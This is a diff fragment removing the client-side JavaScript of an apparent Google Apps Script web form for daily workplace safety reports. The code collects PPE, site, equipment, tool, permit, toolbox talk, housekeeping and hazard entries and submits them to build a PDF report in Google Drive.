-      const form = document.getElementById('consolidatedMegaForm');
-      const fd = new FormData(form);
-      
-      let ppeArray = [];
-      document.querySelectorAll('.ppe-row').forEach(row => {
-        let name = row.querySelector('.row-emp-name').value;
-        if(name) {
-          ppeArray.push({ "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Emp_Name": name, "Designation": row.querySelector('.row-emp-desig').value, "SH": row.querySelector('.row-sh').value, "SG": row.querySelector('.row-sg').value, "SJ": row.querySelector('.row-sj').value, "SS": row.querySelector('.row-ss').value, "SG2": row.querySelector('.row-sg2').value, "NM": row.querySelector('.row-nm').value, "GA": row.querySelector('.row-ga').value, "SF": row.querySelector('.row-sf').value, "Remarks": row.querySelector('.row-rem').value });
-        }
-      });
-      if(ppeArray.length === 0) {
-        ppeArray.push({ "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Emp_Name": "N/A" });
-      }
-
-      let siteArray = [];
-      document.querySelectorAll('.site-row').forEach(row => {
-        let desc = row.querySelector('.row-site-desc').value;
-        if(desc) {
-          siteArray.push({ "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Time": row.querySelector('.row-site-time').value, "Inspection_Location": row.querySelector('.row-site-loc').value, "Type": row.querySelector('.row-site-type').value, "Description": desc, "Photos": row.querySelector('.row-site-photos').value, "Immediate_Action": fd.get("site_immediate_action"), "Follow_Issue": fd.get("follow_issue"), "Follow_Resp": fd.get("follow_resp"), "Follow_Target": fd.get("follow_target") });
-        }
-      });
-      if(siteArray.length === 0) {
-        siteArray.push({ "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Description": "No Unsafe Act/Condition Detected" });
-      }
-
-      let eqArray = [];
-      document.querySelectorAll('.eq-row').forEach(row => {
-        let asset = row.querySelector('.row-eq-veh').value;
-        if(asset) {
-          eqArray.push({ "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Vehicle_Asset": asset, "Check_Type": row.querySelector('.row-eq-chk').value, "Safety_Devices": row.querySelector('.row-eq-dev').value, "Status": row.querySelector('.row-eq-stat').value, "Remarks": row.querySelector('.row-eq-rem').value });
-        }
-      });
-      if(eqArray.length === 0) {
-        eqArray.push({ "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Vehicle_Asset": "N/A" });
-      }
-
-      let toolArray = [];
-      document.querySelectorAll('.tool-row').forEach(row => {
-        let tName = row.querySelector('.row-tool-name').value;
-        if(tName) {
-          toolArray.push({ "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Tool_Name": tName, "Qty": row.querySelector('.row-tool-qty').value, "Condition": row.querySelector('.row-tool-cond').value, "User_Dept": row.querySelector('.row-tool-dept').value, "Tool_Location": row.querySelector('.row-tool-loc').value, "Remarks": row.querySelector('.row-tool-rem').value });
-        }
-      });
-      if(toolArray.length === 0) {
-        toolArray.push({ "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Tool_Name": "N/A" });
-      }
-
-      const payload = {
-        "Permit_Review": { "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Permit_No": fd.get("p_no")||"N/A", "Taken_By": fd.get("p_taken")||"N/A", "Review_By": fd.get("p_review")||"N/A", "Scope_V": fd.get("p_v1")||"N/A", "Hazards_V": fd.get("p_v2")||"N/A", "Control_V": fd.get("p_v3")||"N/A", "Aware_V": fd.get("p_v4")||"N/A", "Signatures_V": fd.get("p_v5")||"N/A", "Observations": fd.get("p_observations")||"None", "Actions": fd.get("p_actions")||"None" },
-        "Toolbox_Talk": { "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Attendees": fd.get("tbt_attendees")||"0", "Topics": fd.get("tbt_topics")||"N/A", "Prev_Incidents": fd.get("tbt_prev_incidents")||"N/A", "Critical_Tasks": fd.get("tbt_critical_tasks")||"N/A", "Specific_Procedures": fd.get("tbt_specific_proc")||"N/A", "Theme": fd.get("tbt_theme")||"N/A", "Reminders": fd.get("tbt_reminders")||"N/A", "Forum": fd.get("tbt_forum")||"N/A", "Takeaways": fd.get("tbt_takeaways")||"N/A", "Conducted_By": fd.get("tbt_conducted_by")||supervisorIdentityName },
-        "PPE_Checking": ppeArray,
-        "Site_Inspection": siteArray,
-        "Equipment_Inspection": eqArray,
-        "Tool_Inspection": toolArray,
-        "Housekeeping": { "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "C1_Sort": fd.get("hk_c1")||"√", "C2_Use": fd.get("hk_c2")||"√", "C3_Spare": fd.get("hk_c3")||"√", "C4_Remove": fd.get("hk_c4")||"√", "C5_Place": fd.get("hk_c5")||"√", "C6_Decided": fd.get("hk_c6")||"√", "C7_Restroom": fd.get("hk_c7")||"√", "C8_IdSystem": fd.get("hk_c8")||"√", "Observations": fd.get("hk_observations")||"Clean Area", "Actions_Taken": fd.get("hk_actions_taken")||"None" },
-        "Safety_Interaction": { "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Interaction_Name": fd.get("si_name")||"N/A", "Discussion_Point": fd.get("si_point")||"N/A", "Employee_Covered": fd.get("si_emp_count")||"0", "Feedback": fd.get("si_feedback")||"Y" },
-        "Hazard_Reporting": { "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Report_Type": fd.get("hz_type")||"Hazard", "Description": fd.get("hz_desc")||"None", "Immediate_Actions": fd.get("hz_actions")||"None", "Investigation": fd.get("hz_investigation")||"N" },
-        "Training_Obs": { "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "Observation": fd.get("train_obs")||"N/A", "Action_Taken": fd.get("train_action")||"N/A", "Needs_Identified": fd.get("train_needs")||"N/A" },
-        "Administrative": { "Date": fDate, "Location": fLoc, "Safety_Supervisor": supervisorIdentityName, "SOP_No": fd.get("doc_sop_no")||"N/A", "Compliance": fd.get("doc_compliance")||"N/A", "Adequacy": fd.get("doc_adequacy")||"Adequate", "Action_By": fd.get("doc_action_by")||"N/A", "Remarks": fd.get("doc_remarks")||"N/A" }
-      };
-
-      google.script.run.withSuccessHandler(function(res) {
-        sBtn.disabled = false;
-        sBtn.innerText = "CONSOLIDATE & TRANSMIT";
-        if(res && res.status === "success") {
-          document.getElementById('pdf-message-text').innerText = res.message;
-          document.getElementById('pdf-download-link').href = res.pdfUrl;
-          document.getElementById('pdf-alert-box').classList.remove('d-none');
-          window.scrollTo({top: 0, behavior: 'smooth'});
-          alert("Success! Report saved and PDF generated inside Google Drive.");
-        } else {
-          alert("Error: " + res.message);
-        }
-      }).saveConsolidatedDMP(JSON.stringify(payload));
-    }
-  </script>
 </body>
 </html>
